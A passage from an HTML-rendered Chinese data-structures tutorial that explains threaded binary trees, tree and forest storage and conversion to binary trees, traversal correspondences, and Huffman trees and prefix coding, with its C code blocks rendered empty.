<th style="text-align:center">lchild</th>
<th style="text-align:center">ltag</th>
<th style="text-align:center">data</th>
<th style="text-align:center">rtag</th>
<th style="text-align:center">rchild</th>
</tr>
</thead>
</table>
<p>其中，标志域的含义如下：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mi>t</mi><mi>a</mi><mi>g</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>c</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>d</mi><mtext>域指示结点的左孩子</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>c</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>d</mi><mtext>域指示结点的前驱</mtext></mrow></mstyle></mtd></mtr></mtable></mrow><mspace linebreak="newline"></mspace><mi>r</mi><mi>t</mi><mi>a</mi><mi>g</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>r</mi><mi>c</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>d</mi><mtext>域指示结点的右孩子</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>r</mi><mi>c</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>d</mi><mtext>域指示结点的后继</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
ltag = \begin{cases}
  0, &amp; lchild \text{域指示结点的左孩子} \\
  1, &amp; lchild \text{域指示结点的前驱}
\end{cases} \\
rtag = \begin{cases}
  0, &amp; rchild \text{域指示结点的右孩子} \\
  1, &amp; rchild \text{域指示结点的后继}
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">lt</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">hi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">d</span><span class="mord text"><span class="mord cjk_fallback">域指示结点的左孩子</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">hi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">d</span><span class="mord text"><span class="mord cjk_fallback">域指示结点的前驱</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">rc</span><span class="mord mathnormal">hi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">d</span><span class="mord text"><span class="mord cjk_fallback">域指示结点的右孩子</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">rc</span><span class="mord mathnormal">hi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">d</span><span class="mord text"><span class="mord cjk_fallback">域指示结点的后继</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>线索二叉树的存储结构描述如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>以这种结点结构构成的二叉链表作为二叉树的存储结构，称为 <strong>线索链表</strong>，其中指向结点前驱和后继的指针称为 <strong>线索</strong>。加上线索的二叉树称为 <strong>线索二叉树。</strong></p>
</li>
<li>
<p><strong>中序线索二叉树的构造</strong></p>
<p>二叉树的线索化是将二叉链表中的空指针改为指向前驱或后继的线索。而前驱或后继的信息只有在遍历时才能得到，因此线索化的实质就是遍历一次二叉树。</p>
<p>以中序线索二叉树的建立为例。附设指针 <code>pre</code> 指向刚刚访问过的结点，指针 <code>p</code> 指向正在访问的结点，即 <code>pre</code> 指向 <code>p</code> 的前驱。在中序遍历的过程中，检查 <code>p</code> 的左指针是否为空，若为空就将它指向 <code>pre</code>；检查 <code>pre</code> 的右指针是否为空，若为空就将它指向 <code>p</code>。</p>
<p>通过中序遍历对二叉树线索化的递归算法如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过中序遍历建立中序线索二叉树的主过程算法如下:</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>为了方便，可以在二叉树的线索链表上也添加一个头结点，令其 <code>lchild</code> 域的指针指向二叉树的根结点，其 <code>rchild</code> 域的指针指向中序遍历时访问的最后一个结点；令二叉树中序序列中的第一个结点的 <code>lchild</code> 域指针和最后一个结点的 <code>rchild</code> 域指针均指向头结点。这好比为二叉树建立了一个双向线索链表，方便从前往后或从后往前对线索二叉树进行遍历。</p>
</li>
<li>
<p><strong>中序线索二叉树的遍历</strong></p>
<p>中序线索二叉树的结点中隐含了线索二叉树的前驱和后继信息。在对其进行遍历时，只要先找到序列中的第一个结点，然后依次找结点的后继，直至其后继为空。<strong>在中序线索二叉树中找结点后继的规律是</strong>：若其右标志为 <code>1</code>，则右链为线索，指示其后继，否则遍历右子树中第一个访问的结点（右子树中最左下的结点）为其后继。<strong>不含头结点的线索二叉树的遍历算法如下：</strong></p>
<ol>
<li>
<p>求中序线索二叉树中中序序列下的第一个结点：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>求中序线索二叉树中结点 <code>p</code> 在中序序列下的后继：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>利用上面两个算法，可以写出不含头结点的中序线索二叉树的中序遍历的算法：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ol>
</li>
<li>
<p><strong>先序线索二叉树和后序线索二叉树</strong></p>
<p>上面给出了建立中序线索二叉树的代码，建立先序线索二叉树和建立后序线索二叉树的代码类似，只需变动线索化改造的代码段与调用线索化左右子树递归函数的位置。</p>
<p>例如给出手动求先序线索二叉树的过程：先序序列为 ABCDF，然后依次判断每个结点的左右链域，如果为空则将其改造为线索。结点 A, B 均有左右孩子；结点 C 无左孩子，将左链域指向前驱 B，无右孩子，将右链域指向后继 D；结点 D无左孩子，将左链域指向前驱 C，无右孩子，将右链域指向后继 F；结点 F 无左孩子，将左链域指向前驱 D，无右孩子，也无后继，故置空。求后序线索二叉树的过程：后序序列为 CDBFA，结点 C 无左孩子，也无前驱故置空，无右孩子，将右链域指向后继 D；结点 D 无左孩子，将左链域指向前驱 C，无右孩子，将右链域指向后继 B；结点 F 无左孩子，将左链域指向前驱 B，无右孩子，将右链域指向后继 A。</p>
<p>如何在先序线索二叉树中找结点的后继？如果有左孩子，则左孩子就是其后继；如果无左孩子但有右孩子，则右孩子就是其后继；如果为叶结点，则右链域直接指示了结点的后继。</p>
<p>在后序线索二叉树中找结点的后继较为复杂，可分三种情况：</p>
<ol>
<li>若结点 x 是二叉树的根，则其后继为空</li>
<li>若结点 x 是其双亲的右孩子，或是其双亲的左孩子且其双亲没有右子树，则其后继即为双亲</li>
<li>若结点 x 是其双亲的左孩子，且其双亲有右子树，则其后继为双亲的右子树上按后序遍历列出的第一个结点</li>
</ol>
<p>可见在后序线索二叉树上找后继时需知道结点双亲，即需采用带标志域的三叉链表作为存储结构。</p>
</li>
</ol>
<h3> 树、森林</h3>
<h4> 树的存储结构</h4>
<p>树的存储方式有多种，既可采用顺序存储结构，又可采用链式存储结构，但无论采用何种存储方式，都要求能唯一地反映树中各结点之间的逻辑关系，常用的存储结构有以下三种：</p>
<ol>
<li>
<p><strong>双亲表示法</strong></p>
<p>这种存储结构采用一组连续空间来存储每个结点，同时在每个结点中增设一个伪指针，指示其双亲结点在数组中的位置。根结点下标为 <code>0</code>，其伪指针域为 <code>-1</code>。</p>
<p>双亲表示法的存储结构描述如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该存储结构利用了每个结点（根结点除外）只有唯二双亲的性质，可以很快地得到每个结点的双亲结点，但求结点的孩子时则需要遍历整个结构。</p>
<div class="hint-container tip">
<p class="hint-container-title">区别树的顺序存储结构与二叉树的顺序存储结构</p>
<p>在树的顺序存储结构中，数组下标代表结点的编号，下标中所存的内容指示了结点之间的关系。而在二叉树的顺序存储结构中，数组下标既代表了结点的编号，又指示了二叉树中各结点之间的关系。当然，二叉树属于树，因此二叉树都可以用树的存储结构来存储，但树却不都能用二叉树的存储结构来存储</p>
</div>
</li>
<li>
<p><strong>孩子表示法</strong></p>
<p>孩子表示法是将每个结点的孩子结点都用单链表链接起来形成一个线性结构，此时 <code>n</code> 个结点就有 <code>n</code> 个孩子链表（叶结点的孩子链表为空表）。</p>
<p>这种存储结构寻找子女的操作非常直接，而寻找双亲的操作需要遍历 <code>n</code> 个结点中孩子链表指针域所指向的 <code>n</code> 个孩子链表。</p>
</li>
<li>
<p><strong>孩子兄弟表示法</strong></p>
<p>孩子兄弟表示法又称 <strong>二叉树表示法</strong>，即以二叉链表作为树的存储结构。孩子兄弟表示法使每个结点包括三部分内容：结点值、指向结点第一个孩子结点的指针，以及指向结点下一个兄弟结点的指针（沿此域可以找到结点的所有兄弟结点）。孩子兄弟表示法的存储结构描述如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这种存储表示法比较灵活，其最大的 <strong>优点是</strong> 可以方便地实现树转换为二叉树的操作，易于查找结点的孩子等，但 <strong>缺点是</strong> 从当前结点查找其双亲结点比较麻烦。若为每个结点增设一个 <code>parent</code> 域指向其父结点，则查找结点的父结点也很方便。</p>
</li>
</ol>
<h4> 树、森林与二叉树的转换</h4>
<p>由于二叉树和树都可以用二叉链表作为存储结构，因此以二叉链表作为媒介可以导出树与二叉树的一个对应关系，即给定一棵树，可以找到唯一的一棵二叉树与之对应。从物理结构上看，它们的二叉链表是相同的，只是解释不同而已。</p>
<p><strong>树转换为二叉树的规则</strong>：每个结点左指针指向它的第一个孩子，右指针指向它在树中的相邻右兄弟，这个规则又称 <strong>左孩子右兄弟</strong>。由于根结点没有兄弟，所以对应的二叉树没有右子树。</p>
<p><strong>树转换成二叉树的画法</strong>：</p>
<ol>
<li>在兄弟结点之间加一连线</li>
<li>对每个结点，只保留它与第一个孩子的连线，而与其他孩子的连线全部抹掉</li>
<li>以树根为轴心，顺时针旋转 45°</li>
</ol>
<p>将森林转换为二叉树的规则与树类似。先将森林中的每棵树转换为二叉树，由于任意一棵和树对应的二叉树的右子树必空，若把森林中第二棵树根视为第一棵树根的右兄弟，即将第二棵树对应的二叉树当作第一棵二叉树根的右子树，将第三棵树对应的二叉树当作第二棵二叉树根的右子树……以此类推，就可以将森林转换为二叉树。</p>
<p><strong>森林转换成二叉树的画法</strong>：</p>
<ol>
<li>将森林中的每棵树转换成相应的二叉树</li>
<li>每棵树的根也可视为兄弟关系，在每棵树的根之间加一根连线</li>
<li>以第一棵树的根为轴心顺时针旋转 45°</li>
</ol>
<p><strong>二叉树转换为森林的规则</strong>：若二叉树非空，则二叉树的根及其左子树为第一棵树的二叉树形式，故将根的右链断开。二叉树根的右子树又可视为一个由除第一棵树外的森林转换后的二叉树，应用同样的方法，直到最后只剩一棵没有右子树的二叉树为止，最后再将每棵二叉树依次转换成树，就得到了森林。二叉树转换为树或森林是唯一的。</p>
<h4> 树和森林的遍历</h4>
<p>树的遍历是指用某种方式访问树中的每个结点，且仅访问一次。主要有两种方式：</p>
<ul>
<li><strong>先根遍历</strong>：若树非空，先访问根结点，再依次遍历根结点的每棵子树，遍历子树时仍遵循先根后子树的规则。其遍历序列与这棵树相应二叉树的先序序列相同</li>
<li><strong>后根遍历</strong>：若树非空，先依次遍历根结点的每棵子树，再访问根结点，遍历子树时仍遵循先子树后根的规则。其遍历序列与这棵树相应二叉树的中序序列相同</li>
</ul>
<p>另外，树也有层次遍历，与二叉树的层次遍历思想基本相同，即按层序依次访问各结点。</p>
<p>按照森林和树相互递归的定义，可得到森林的两种遍历方法。</p>
<ol>
<li>
<p>先序遍历森林。若森林为非空，则按如下规则进行遍历：</p>
<ul>
<li>访问森林中第一棵树的根结点</li>
<li>先序遍历第一棵树中根结点的子树森林</li>
<li>先序遍历除去第一棵树之后剩余的树构成的森林</li>
</ul>
</li>
<li>
<p>中序遍历森林。森林为非空时，按如下规则进行遍历：</p>
<ul>
<li>中序遍历森林中第一棵树的根结点的子树森林</li>
<li>访问第一棵树的根结点</li>
<li>中序遍历除去第一棵树之后剩余的树构成的森林</li>
</ul>
</li>
</ol>
<p>当森林转换成二叉树时，其第一棵树的子树森林转换成左子树，剩余树的森林转换成右子树，可知森林的先序和中序遍历即为其对应二叉树的先序和中序遍历。</p>
<p>树和森林的遍历与二叉树的遍历关系见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">树</th>
<th style="text-align:center">森林</th>
<th style="text-align:center">二叉树</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">先根遍历</td>
<td style="text-align:center">先序遍历</td>
<td style="text-align:center">先序遍历</td>
</tr>
<tr>
<td style="text-align:center">后根遍历</td>
<td style="text-align:center">中序遍历</td>
<td style="text-align:center">中序遍历</td>
</tr>
</tbody>
</table>
<h3> 树与二叉树的应用</h3>
<h4> 哈夫曼树和哈夫曼编码</h4>
<ol>
<li>
<p><strong>哈夫曼树的定义</strong></p>
<p>在许多应用中，树中结点常常被赋予一个表示某种意义的数值，称为该结点的 <strong>权</strong>。从树的根到任意结点的路径长度（经过的边数）与该结点上权值的乘积，称为该结点的 <strong>带权路径长度</strong>。树中所有叶结点的带权路径长度之和称为该树的带权路径长度，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mi>P</mi><mi>L</mi><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>w</mi><mi>i</mi></msub><msub><mi>l</mi><mi>i</mi></msub></mstyle></mrow><annotation encoding="application/x-tex">WPL = \displaystyle\sum_{i=1}^n w_{i}l_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个叶结点所带的权值，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>l</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">l_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是该叶结点到根结点的路径长度。</p>
<p>在含有 <code>n</code> 个带权叶结点的二叉树中，其中带权路径长度（WPL）最小的二叉树称为 <strong>哈夫曼树</strong>，也称最优二叉树。</p>
</li>
<li>
<p><strong>哈夫曼树的构造</strong></p>
<p>给定 <code>n</code> 个权值分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>w</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>w</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">w_{1}, w_{2}, \dotsc, w_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的结点，<strong>构造哈夫曼树的算法描述如下：</strong></p>
<ol>
<li>将这 <code>n</code> 个结点分别作为 <code>n</code> 棵仅含一个结点的二叉树，构成森林 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></li>
<li>构造一个新结点，从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span> 中选取两棵根结点权值最小的树作为新结点的左、右子树，并且将新结点的权值置为左、右子树上根结点的权值之和</li>
<li>从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span> 中删除刚才选出的两棵树，同时将新得到的树加入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span> 中</li>
<li>重复步骤 <code>2</code> 和 <code>3</code>，直至 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span> 中只剩下一棵树为止</li>
</ol>
<p>从上述构造过程中可以看出 <strong>哈夫曼树具有如下特点：</strong></p>
<ul>
<li>每个初始结点最终都成为叶结点，且权值越小的结点到根结点的路径长度越大</li>
<li>构造过程中共新建了 <code>n - 1</code> 个结点（双分支结点），因此哈夫曼树的结点总数为 <code>2n - 1</code></li>
<li>每次构造都选择 <code>2</code> 棵树作为新结点的孩子，因此哈夫曼树中不存在度为 <code>1</code> 的结点。</li>
</ul>
</li>
<li>
<p><strong>哈夫曼编码</strong></p>
<p>在数据通信中，若对每个字符用相等长度的二进制位表示，称这种编码方式为 <strong>固定长度编码</strong>。若允许对不同字符用不等长的二进制位表示，则这种编码方式称为 <strong>可变长度编码</strong>。可变长度编码比固定长度编码要好得多，其特点是对频率高的字符赋以短编码，而对频率较低的字符则赋以较长一些的编码，从而可以使字符的平均编码长度减短，起到压缩数据的效果。哈夫曼编码是一种被广泛应用而且非常有效的数据压缩编码。</p>
<p>若没有一个编码是另一个编码的前缀，则称这样的编码为 <strong>前缀编码</strong>。举例：设计字符 A、B 和 C 对应的编码 0、101 和 100 是前缀编码。对前缀编码的解码很简单，因为没有一个编码是其他编码的前缀。所以识别出第一个编码，将它翻译为原码，再对余下的编码文件重复同样的解码操作。例如：码串 00101100 可被唯一地翻译为 0、0、101 和 100。另举反例：如果再将字符 D 的编码设计为 00，此时 0 是 00 的前缀，那么这样的码串的前两位就无法唯一翻译。</p>
